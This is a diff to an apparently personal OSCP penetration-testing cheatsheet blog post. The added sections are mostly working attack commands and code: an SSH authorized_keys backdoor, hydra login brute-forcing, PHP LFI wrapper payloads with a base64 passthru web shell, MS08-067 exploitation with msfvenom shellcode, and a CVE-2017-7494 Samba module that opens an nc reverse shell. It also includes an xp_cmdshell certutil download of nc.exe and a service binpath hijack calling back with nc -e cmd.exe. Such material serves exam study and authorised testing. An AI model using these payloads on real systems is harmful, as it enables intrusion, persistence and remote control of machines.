@@ -1,4 +1,5 @@
 ---
+
 layout: post
 title: OSCP personal cheatsheet
 tags: [OSCP, Cheatsheet]
@@ -16,13 +17,14 @@ description: "OSCP personal cheat sheet"
 - [SSH - 22](#ssh---22)
   * [Brute force](#brute-force-1)
   * [CVE-2008-0166](#cve-2008-0166)
+  * [SSH backdoor - post exploitation](#ssh-backdoor---post-exploitation)
 - [DNS - 53](#dns---53)
   * [Zone transfert](#zone-transfert)
   * [DNS brute force](#dns-brute-force)
 - [FINGER - 79](#finger---79)
   * [User enumeration](#user-enumeration)
   * [Command execution](#command-execution)
-- [HTTP/HTTPS - 80/443](#http-https---80-443)
+- [HTTP/HTTPS - 80/443](#HTTP/HTTPS - 80/443)
   * [Automatic scanners](#automatic-scanners)
   * [Wordpress](#wordpress)
     + [Wordpress panel RCE](#wordpress-panel-rce)
@@ -36,9 +38,19 @@ description: "OSCP personal cheat sheet"
     + [Brute force](#brute-force-2)
     + [Tomcat panel RCE](#tomcat-panel-rce)
   * [WebDav](#webdav)
+  * [HTTP brute force authentication](#http-brute-force-authentication)
+    + [HTTP basic authentication](#http-basic-authentication)
+    + [HTTP GET request](#http-get-request)
+    + [HTTP POST request](#http-post-request)
   * [Spidering / Brute force directories / files](#spidering---brute-force-directories---files)
     + [File backups](#file-backups)
   * [Local File Inclusion / Remote File Inclusion - LFI / RFI](#local-file-inclusion---remote-file-inclusion---lfi---rfi)
+    + [Wrappers](#wrappers)
+      - [Wrapper php://filter](#wrapper-php---filter)
+      - [Wrapper expect://](#wrapper-expect---)
+      - [Wrapper data://](#wrapper-data---)
+      - [Wrapper input://](#wrapper-input---)
+  * [Useful LFI list](#useful-lfi-list)
     + [Tools](#tools)
   * [Command injection](#command-injection)
   * [Deserialization](#deserialization)
@@ -46,6 +58,7 @@ description: "OSCP personal cheat sheet"
   * [SQL injection](#sql-injection)
   * [XSS](#xss)
   * [Other web vulnerabilities](#other-web-vulnerabilities)
+  * [Upload a file with PUT](#upload-a-file-with-put)
 - [KERBEROS - 88](#kerberos---88)
 - [POP3 - 110](#pop3---110)
   * [Brute force](#brute-force-3)
@@ -58,19 +71,23 @@ description: "OSCP personal cheat sheet"
   * [Graphical Interface](#graphical-interface)
 - [SMB - 445](#smb---445)
   * [Version if nmap didn't detect it](#version-if-nmap-didn-t-detect-it)
-  * [Scans](#scans-1)
+  * [Scan for vulnerability](#scan-for-vulnerability)
+  * [Manual testing](#manual-testing)
   * [Brute force](#brute-force-4)
   * [Mount a SMB share](#mount-a-smb-share)
   * [Get a shell](#get-a-shell)
-  * [EternalBlue](#eternalblue)
+  * [EternalBlue (MS17-010)](#EternalBlue (MS17-010))
     + [Check if vulnerable](#check-if-vulnerable)
     + [Prepare shellcodes and listeners](#prepare-shellcodes-and-listeners)
     + [Exploit](#exploit)
   * [If this doesn't work, try this one](#if-this-doesn-t-work--try-this-one)
+  * [MS08-067](#ms08-067)
+  * [CVE-2017-7494](#cve-2017-7494)
 - [MSSQL - 1433](#mssql---1433)
   * [Get information](#get-information)
   * [Brute force](#brute-force-5)
   * [Having credentials](#having-credentials)
+  * [Manual exploit](#manual-exploit)
 - [NFS - 2049](#nfs---2049)
   * [Show Mountable NFS Shares](#show-mountable-nfs-shares)
   * [Mount a share](#mount-a-share)
@@ -80,9 +97,7 @@ description: "OSCP personal cheat sheet"
   * [Extracting MySQL credentials from files](#extracting-mysql-credentials-from-files)
   * [Connect](#connect)
   * [MySQL commands](#mysql-commands)
-  * [Useful files](#useful-files)
-    + [Linux](#linux)
-    + [Windows](#windows)
+  * [Manual exploit](#manual-exploit-1)
 - [RDP - 3389](#rdp---3389)
   * [Brute force](#brute-force-7)
   * [Connect with known credentials / hash](#connect-with-known-credentials---hash)
@@ -91,12 +106,12 @@ description: "OSCP personal cheat sheet"
     + [Access to the selected](#access-to-the-selected)
   * [Adding user to RDP group (Windows)](#adding-user-to-rdp-group--windows-)
 - [VNC - 5800 - 58001 - 5900 - 5901](#vnc---5800---58001---5900---5901)
-  * [Scans](#scans-2)
+  * [Scans](#scans-1)
   * [Brute force](#brute-force-8)
   * [Connect](#connect-1)
   * [Found VNC password](#found-vnc-password)
-    + [Linux](#linux-1)
-    + [Windows](#windows-1)
+    + [Linux](#linux)
+    + [Windows](#windows)
   * [Decrypt VNC password](#decrypt-vnc-password)
 - [WINRM - 5985 - 5986](#winrm---5985---5986)
   * [Brute force](#brute-force-9)
@@ -109,20 +124,20 @@ description: "OSCP personal cheat sheet"
   * [Cross compile](#cross-compile)
 - [DICTIONARY GENERATION](#dictionary-generation)
 - [FILE TRANSFER](#file-transfer)
-  * [Linux](#linux-2)
-  * [Windows](#windows-2)
+  * [Linux](#linux-1)
+  * [Windows](#windows-1)
 - [GIT](#git)
   * [Download .git](#download-git)
   * [Extract .git content](#extract-git-content)
 - [HASHES](#hashes)
-  * [Windows](#windows-3)
-  * [Linux](#linux-3)
+  * [Windows](#windows-2)
+  * [Linux](#linux-2)
 - [MIMIKATZ](#mimikatz)
 - [MISCELLANEOUS](#miscellaneous)
   * [Get a Windows path without spaces](#get-a-windows-path-without-spaces)
 - [MSFVENOM PAYLOAD](#msfvenom-payload)
-  * [Linux](#linux-4)
-  * [Windows](#windows-4)
+  * [Linux](#linux-3)
+  * [Windows](#windows-3)
   * [PHP](#php)
   * [ASP](#asp)
   * [JSP](#jsp)
@@ -145,12 +160,12 @@ description: "OSCP personal cheat sheet"
   * [Sshuttle](#sshuttle)
   * [Proxychains](#proxychains)
 - [PRIVILE ESCALATION](#privile-escalation)
-  * [Linux](#linux-5)
+  * [Linux](#linux-4)
     + [Enumeration scripts](#enumeration-scripts)
   * [Vulnerability scan](#vulnerability-scan)
   * [Suid checker](#suid-checker)
   * [Methodology to follow](#methodology-to-follow)
-  * [Windows](#windows-5)
+  * [Windows](#windows-4)
     + [Enumeration scripts](#enumeration-scripts-1)
       - [General scans](#general-scans)
       - [Search for CVE](#search-for-cve)
@@ -184,8 +199,8 @@ description: "OSCP personal cheat sheet"
     + [Windows 10](#windows-10)
     + [Windows Server 2003](#windows-server-2003)
 - [PROOFS](#proofs)
-  * [Linux](#linux-6)
-  * [Windows](#windows-6)
+  * [Linux](#linux-5)
+  * [Windows](#windows-5)
 - [REVERSE SHELL](#reverse-shell)
   * [Bash](#bash-1)
   * [Perl](#perl-1)
@@ -202,7 +217,7 @@ description: "OSCP personal cheat sheet"
   * [Determine the current version of Linux](#determine-the-current-version-of-linux)
   * [Determine more information about the environment](#determine-more-information-about-the-environment)
   * [List processes running](#list-processes-running)
-  * [List the allowed (and forbidden) commands for the invoking use](#list-the-allowed--and-forbidden--commands-for-the-invoking-use)
+  * [List the allowed (and forbidden) commands for the invoking use](#List the allowed (and forbidden) commands for the invoking use)
 - [USEFUL WINDOWS COMMANDS](#useful-windows-commands)
 - [ZIP](#zip)
 
@@ -291,6 +306,21 @@ tar -xvf debian_ssh_dsa_1024_x86.tar
 
 python 5720 rsa/2048 <IP> <USER> <PORT> <THREADS>
 python 5720 dsa/1024 <IP> <USER> <PORT> <THREADS>
+```
+
+### SSH backdoor - post exploitation
+
+```
+# Attacker
+ssh-keygen -f <FILENAME>
+chmod 600 <FILENAME>
+cat <FILENAME>.pub -> copy
+
+# Victim
+echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys
+
+# Connect
+ssh -i <FILENAME> <USER>@<IP>
 ```
 
 ------
@@ -397,7 +427,7 @@ Accessing /user/<number> you can see the number of existing users :
 Fuzz /node/<NUMBER> where <NUMBER> is a number (from 1 to 500 for example).
 You could find hidden pages (test, dev) which are not referenced by the search engines.
 
-wfuzz -c -z range,1-500 --hc 404 <URL>/FUZZ
+wfuzz -c -z range,1-500 --hc 404 <URL>/node/FUZZ
 ```
 
 #### Drupal panel RCE
@@ -451,19 +481,39 @@ Tomcat6 :
 wget 'http://<USER>:<PASSWORD>@<IP>:8080/manager/deploy?war=file:shell.war&path=/shell' -O -
 
 Tomcat7 and above :
-wget 'http://<USER>:<PASSWORD>@<IP>:8080/manager/text/deploy?war=file:shell.war&path=/shell' -O -
+curl -v -u <USER>:<PASSWORD> -T shell.war 'http://<IP>:8080/manager/text/deploy?path=/shellh&update=true'
 
 # Listener
 nc -lvp <PORT>
 
 # Execute payload
-wget http://<IP>:8080/shell
+curl http://<IP>:8080/shell/
 ```
 
 ### WebDav
 
 ```
 davtest -url <URL>
+```
+
+### HTTP brute force authentication
+
+#### HTTP basic authentication
+
+```
+hydra -l <USER> -V -P <PASSWORDS_LIST> -s 80 -f <IP> http-get /<URL_ENDPOINT>/ -t 15
+```
+
+#### HTTP GET request
+
+```
+hydra <IP> -V -l <USER> -P <PASSWORDS_LIST> http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t <THREADS_NUMBER>
+```
+
+#### HTTP POST request
+
+```
+hydra -l <USER> -P <PASSWORDS_LIST> <IP> http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t <THREADS_NUMBER>
 ```
 
 ### Spidering / Brute force directories / files
@@ -492,6 +542,65 @@ file.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file
 
 ```
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+```
+
+#### Wrappers
+
+##### Wrapper php://filter
+
+```
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=
+```
+
+##### Wrapper expect://
+
+```
+http://example.com/index.php?page=expect://id
+```
+
+##### Wrapper data://
+
+```
+echo '<?php phpinfo(); ?>' | base64 -w0 -> PD9waHAgcGhwaW5mbygpOyA/Pgo=
+
+http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=
+
+If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.
+
+Code execution with 
+	- exec
+	- shell_exec
+	- system
+	- passthru
+	- popen
+
+# Exemple
+echo '<?php passthru($_GET["cmd"]);echo "Shell done !"; ?>' | base64 -w0 -> PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=
+
+http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=
+
+If there is "Shell done !" on the webpage, then there is code execution and you can do things like :
+
+http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&cmd=ls
+```
+
+##### Wrapper input://
+
+```
+curl -k -v "http://example.com/index.php?page=php://input" --data "<?php echo shell_exec('id'); ?>"
+```
+
+### Useful LFI list
+
+```
+# Linux
+/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
+
+# Windows
+/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
+
+# Both
+/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
 ```
 
 #### Tools
@@ -543,6 +652,12 @@ cat /usr/share/beef-xss/config.yaml | grep user -C 1 # user / password
 
 ```
 https://github.com/swisskyrepo/PayloadsAllTheThings
+```
+
+### Upload a file with PUT
+
+```
+curl -X PUT http://<IP>/<FILE> -d @<FILE>  -v
 ```
 
 ------
@@ -634,7 +749,19 @@ sudo ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' port 139
 smbclient -L <IP>
 ```
 
-### Scans
+### Scan for vulnerability
+
+```
+nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <IP>
+```
+
+If :
+
+- MS17-010 - [EternalBlue](#EternalBlue (MS17-010))
+- MS08-067 - [MS08-067](#MS08-067)
+- CVE-2017-7494 - [CVE-2017-7494](#CVE-2017-7494)
+
+### Manual testing
 
 ```
 smbmap -H <IP>
@@ -652,7 +779,8 @@ enum4linux -a <IP>
 smbclient --no-pass -L //$IP
 smbclient //<IP>/<SHARE>
 
-nmap --script "safe or smb-enum-*" -p 445 <IP>
+# Download all files from a directory recursively
+smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
 ```
 
 ### Brute force
@@ -689,7 +817,7 @@ atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
 atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 ```
 
-### EternalBlue
+### EternalBlue (MS17-010)
 
 ```
 https://github.com/3ndG4me/AutoBlue-MS17-010
@@ -722,6 +850,85 @@ May need to run it multiple times
 
 ```
 python zzz_exploit.py <IP>
+```
+
+### MS08-067
+
+```
+# Download exploit code
+git clone https://github.com/andyacer/ms08_067.git
+
+# Generate payload
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+msfvenom -p windows/shell_bind_tcp RHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+
+# Modify
+Modify ms08_067_2018.py and replace the shellcode variable by the one generated with msfvenom.
+
+# Listener
+nc -lvp <PORT>
+
+# Exploit
+python ms08_067_2018.py <IP> <NUMBER> 445
+```
+
+### CVE-2017-7494
+
+```
+# Download exploit code
+git clone https://github.com/joxeankoret/CVE-2017-7494
+```
+
+Create a new file named poc.c :
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+int samba_init_module(void)
+{
+	setresuid(0,0,0);
+	system("ping -c 3 <IP>");
+}
+```
+
+```
+# Build
+gcc -o test.so -shared poc.c -fPIC
+```
+
+```
+# Start an ICMP listener
+sudo tcpdump -i <INTERFACE> icmp
+
+# Exploit
+./cve_2017_7494.py -t <TARGET_IP> -u <USER> -P <PASSWORD> --custom=test.so
+```
+
+If you reiceve 3 pings on your listener then the exploit works. Now let's get a shell :
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+int samba_init_module(void)
+{
+	setresuid(0,0,0);
+	system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f");
+}
+```
+
+```
+# Build
+gcc -o test.so -shared poc.c -fPIC
+```
+
+```
+# Start a listener
+nc -lvp <PORT>
+
+# Exploit
+./cve_2017_7494.py -t <TARGET_IP> -u <USER> -P <PASSWORD> --custom=test.so
 ```
 
 ------
@@ -759,6 +966,13 @@ SQL> enable_xp_cmdshell
 # Execute code
 SQL> xp_cmdshell whoami /all
 SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
+```
+
+### Manual exploit
+
+```
+Cheatsheet :
+	- https://www.asafety.fr/mssql-injection-cheat-sheet/
 ```
 
 ------
@@ -852,25 +1066,11 @@ select load_file('<FILE>');
 select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
 ```
 
-### Useful files
-
-#### Linux
+### Manual exploit
 
 ```
-/etc/my.cnf
-/etc/mysql/my.cnf
-/var/lib/mysql/my.cnf
-~/.my.cnf
-/etc/my.cnf
-```
-
-#### Windows
-
-```
-config.ini
-my.ini
-windows\my.ini
-winnt\my.ini
+Cheatsheet :
+	- https://www.asafety.fr/mysql-injection-cheat-sheet/
 ```
 
 ------
@@ -1612,6 +1812,23 @@ To execute it with elevated privileges we need to wait for someone in the Admin 
 #### Detection
 
 ```
+# Find all services authenticated users have modify access onto
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+
+if SERVICE_ALL_ACCESS then vulnerable
+
+# Find all weak folder permissions per drive.
+accesschk.exe /accepteula -uwdqs Users c:\
+accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\
+
+# Find all weak file permissions per drive.
+accesschk.exe /accepteula -uwqs Users c:\*.*
+accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
+```
+
+or
+
+```
 powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
 
 [*] Checking service permissions...
@@ -1647,8 +1864,10 @@ sudo nc -lvp <PORT>
 
 # Victim
 powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
-sc config daclsvc binpath= "C:\Users\User\nc.exe <IP> <PORT> -e cmd.exe"
-sc start daclsvc
+sc config <SERVICENAME> binpath= "<PATH>\nc.exe <IP> <PORT> -e cmd.exe"
+sc start <SERVICENAME>
+or 
+net start <SERVICENAME>
 ```
 
 ### Unquoted service paths
